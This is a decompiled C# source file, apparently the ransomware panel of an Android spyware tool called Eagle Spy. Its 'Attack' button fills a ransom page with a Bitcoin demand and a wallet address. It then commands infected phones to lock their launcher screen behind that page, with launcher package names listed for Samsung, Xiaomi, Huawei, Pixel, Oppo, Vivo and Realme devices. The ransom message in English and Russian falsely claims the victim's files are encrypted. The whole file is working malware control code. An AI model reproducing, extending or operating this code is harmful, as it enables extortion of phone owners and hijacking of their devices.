using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eaglespy
{
	// Token: 0x020000F4 RID: 244
	public partial class Ransomeware : Form
	{
		// Token: 0x06000C57 RID: 3159 RVA: 0x00007852 File Offset: 0x00005A52
		public Ransomeware()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000C58 RID: 3160 RVA: 0x001149B4 File Offset: 0x00112BB4
		private void drakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			this.Replacecurrency();
			this.Replacecaddress();
			this.ReplacecDES();
			this.poco();
			this.huawei();
			this.motorola();
			this.pixel();
			this.vivo();
			this.vivo14();
			this.oppo();
			this.samsung();
			this.redmi();
			this.realme();
		}

		// Token: 0x06000C59 RID: 3161 RVA: 0x00114A10 File Offset: 0x00112C10
		public void addlinks(string lnk)
		{
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				Label label = new Label();
				label.Cursor = Cursors.Hand;
				label.Dock = DockStyle.Top;
				label.Font = new Font("Calibri", 14f);
				label.ForeColor = Color.Aqua;
				label.Size = new Size(631, 40);
				label.TabIndex = 0;
				label.Text = lnk;
				label.TextAlign = ContentAlignment.MiddleCenter;
				label.MouseClick += delegate
				{
					try
					{
						if (this.classClient != null)
						{
							try
							{
								string[] array = this.classClient.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									this.classClient.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"lodp<*>g<*>",
										label.Text,
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										this.classClient.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(array2);
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				};
			}));
		}

		// Token: 0x06000C5A RID: 3162 RVA: 0x00114A44 File Offset: 0x00112C44
		private void BWloader_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				if (this.classClient != null)
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>l<*>",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000C5B RID: 3163 RVA: 0x00114B78 File Offset: 0x00112D78
		private void drakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			string text = "poco";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
			string text2 = "huawei";
			string[] array3 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array4 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text2,
					Data.SPL_SOCKET,
					array3[0],
					Data.SPL_SOCKET,
					array3[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array4);
			string text3 = "motorola";
			string[] array5 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array6 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text3,
					Data.SPL_SOCKET,
					array5[0],
					Data.SPL_SOCKET,
					array5[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array6);
			string text4 = "pixel";
			string[] array7 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array8 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text4,
					Data.SPL_SOCKET,
					array7[0],
					Data.SPL_SOCKET,
					array7[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array8);
			string text5 = "vivo";
			string[] array9 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array10 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text5,
					Data.SPL_SOCKET,
					array9[0],
					Data.SPL_SOCKET,
					array9[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array10);
			string text6 = "vivo14";
			string[] array11 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array12 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text6,
					Data.SPL_SOCKET,
					array11[0],
					Data.SPL_SOCKET,
					array11[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array12);
			string text7 = "oppo";
			string[] array13 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array14 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text7,
					Data.SPL_SOCKET,
					array13[0],
					Data.SPL_SOCKET,
					array13[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array14);
			string text8 = "samsung";
			string[] array15 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array16 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text8,
					Data.SPL_SOCKET,
					array15[0],
					Data.SPL_SOCKET,
					array15[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array16);
			string text9 = "redmi";
			string[] array17 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array18 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text9,
					Data.SPL_SOCKET,
					array17[0],
					Data.SPL_SOCKET,
					array17[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array18);
			string text10 = "realme";
			string[] array19 = this.classClient.Keys.Split(new char[] { ':' });
			object[] array20 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text10,
					Data.SPL_SOCKET,
					array19[0],
					Data.SPL_SOCKET,
					array19[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array20);
		}

		// Token: 0x06000C5C RID: 3164 RVA: 0x00115600 File Offset: 0x00113800
		private void Replacecurrency()
		{
			string text = "C:\\Programs\\Files\\ransomeware\\crypto.html";
			string text2 = "<h1>" + this.guna2TextBox1.Text + "</h1>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 123)
				{
					array[122] = text2;
					File.WriteAllLines(text, array);
					EagleAlert.ShowSucess("Success");
				}
				else
				{
					EagleAlert.ShowError("Error");
				}
			}
			catch (Exception)
			{
				EagleAlert.ShowError("Error");
			}
		}

		// Token: 0x06000C5D RID: 3165 RVA: 0x00115680 File Offset: 0x00113880
		private void Replacecaddress()
		{
			string text = "return";
			string text2 = "C:\\Programs\\Files\\ransomeware\\crypto.html";
			string text3 = text + " '" + this.guna2TextBox2.Text + "'";
			try
			{
				string[] array = File.ReadAllLines(text2);
				if (array.Length >= 193)
				{
					array[192] = text3;
					File.WriteAllLines(text2, array);
					EagleAlert.ShowSucess("Success");
				}
				else
				{
					EagleAlert.ShowError("Error");
				}
			}
			catch (Exception)
			{
				EagleAlert.ShowError("Error");
			}
		}

		// Token: 0x06000C5E RID: 3166 RVA: 0x0011570C File Offset: 0x0011390C
		private void ReplacecDES()
		{
			string text = "C:\\Programs\\Files\\ransomeware\\crypto.html";
			string text2 = "<p>" + this.drakeUIRichTextBox2.Text + "<p>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 136)
				{
					array[135] = text2;
					File.WriteAllLines(text, array);
					EagleAlert.ShowSucess("Success");
				}
				else
				{
					EagleAlert.ShowError("Error");
				}
			}
			catch (Exception)
			{
				EagleAlert.ShowError("Error");
			}
		}

		// Token: 0x06000C5F RID: 3167 RVA: 0x00115790 File Offset: 0x00113990
		private void samsung()
		{
			string text = "samsung>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.sec.android.app.launcher>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C60 RID: 3168 RVA: 0x001158E4 File Offset: 0x00113AE4
		private void redmi()
		{
			string text = "redmi>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.miui.home>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C61 RID: 3169 RVA: 0x00115A38 File Offset: 0x00113C38
		private void realme()
		{
			string text = "realme>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.android.launcher>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C62 RID: 3170 RVA: 0x00115B8C File Offset: 0x00113D8C
		private void oppo()
		{
			string text = "oppo>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.oppo.launcher>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C63 RID: 3171 RVA: 0x00115CE0 File Offset: 0x00113EE0
		private void vivo()
		{
			string text = "vivo>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.bbk.launcher2>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C64 RID: 3172 RVA: 0x00115E34 File Offset: 0x00114034
		private void vivo14()
		{
			string text = "vivo14>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.android.systemui>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C65 RID: 3173 RVA: 0x00115F88 File Offset: 0x00114188
		private void pixel()
		{
			string text = "pixel>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.google.android.apps.nexuslauncher>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C66 RID: 3174 RVA: 0x001160DC File Offset: 0x001142DC
		private void motorola()
		{
			string text = "motorola>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.motorola.launcher3>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C67 RID: 3175 RVA: 0x00116230 File Offset: 0x00114430
		private void huawei()
		{
			string text = "huawei>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.huawei.android.launcher>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C68 RID: 3176 RVA: 0x00116384 File Offset: 0x00114584
		private void poco()
		{
			string text = "poco>http://" + this.ip.Text + ":8081/ransomeware/ransomeware.html>com.mi.android.globallauncher>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C69 RID: 3177 RVA: 0x001164D8 File Offset: 0x001146D8
		private void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.ip.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000C6A RID: 3178 RVA: 0x00007860 File Offset: 0x00005A60
		private void drakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (Clipboard.ContainsText())
			{
				this.guna2TextBox2.Text = Clipboard.GetText();
			}
		}

		// Token: 0x06000C6B RID: 3179 RVA: 0x00007879 File Offset: 0x00005A79
		private void Ransomeware_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			this.DisplayIPv4Address();
		}

		// Token: 0x06000C6C RID: 3180 RVA: 0x00116554 File Offset: 0x00114754
		private void UpdateEnglish()
		{
			this.label8.Text = "Ransomeware";
			this.guna2TextBox1.Text = "PAY 10000$ IN BTC";
			this.drakeUIRichTextBox2.Text = "your phone has been locked and all files , contacts, videos also encrypted, Purchase decryption key to unlock phone within an hour";
			this.drakeUIButtonIcon2.Text = "Stop";
			this.drakeUIButtonIcon1.Text = "Attack";
		}

		// Token: 0x06000C6D RID: 3181 RVA: 0x001165B4 File Offset: 0x001147B4
		private void UpdateChinese()
		{
			this.label8.Text = "Вымогательство";
			this.guna2TextBox1.Text = "ОПЛАТИТЕ 10000$ В BTC";
			this.drakeUIRichTextBox2.Text = "Ваш телефон был заблокирован, и все файлы, контакты, видео также зашифрованы. Приобретите ключ для расшифровки, чтобы разблокировать телефон в течение часа";
			this.drakeUIButtonIcon2.Text = "Остановить";
			this.drakeUIButtonIcon1.Text = "Атака";
		}

		// Token: 0x06000C6E RID: 3182 RVA: 0x001165B4 File Offset: 0x001147B4
		private void UpdateRussian()
		{
			this.label8.Text = "Вымогательство";
			this.guna2TextBox1.Text = "ОПЛАТИТЕ 10000$ В BTC";
			this.drakeUIRichTextBox2.Text = "Ваш телефон был заблокирован, и все файлы, контакты, видео также зашифрованы. Приобретите ключ для расшифровки, чтобы разблокировать телефон в течение часа";
			this.drakeUIButtonIcon2.Text = "Остановить";
			this.drakeUIButtonIcon1.Text = "Атака";
		}

		// Token: 0x06000C6F RID: 3183 RVA: 0x00116614 File Offset: 0x00114814
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x04000FAB RID: 4011
		public Client Classclient;

		// Token: 0x04000FAC RID: 4012
		public string Title;

		// Token: 0x04000FAD RID: 4013
		public string ipaddress;

		// Token: 0x04000FAE RID: 4014
		public string DownloadsFolder;

		// Token: 0x04000FAF RID: 4015
		public object firstclick;

		// Token: 0x04000FB0 RID: 4016
		public Dictionary<string, string> MapData;

		// Token: 0x04000FB1 RID: 4017
		public TcpClient Client;

		// Token: 0x04000FB2 RID: 4018
		public Client classClient;
	}
}
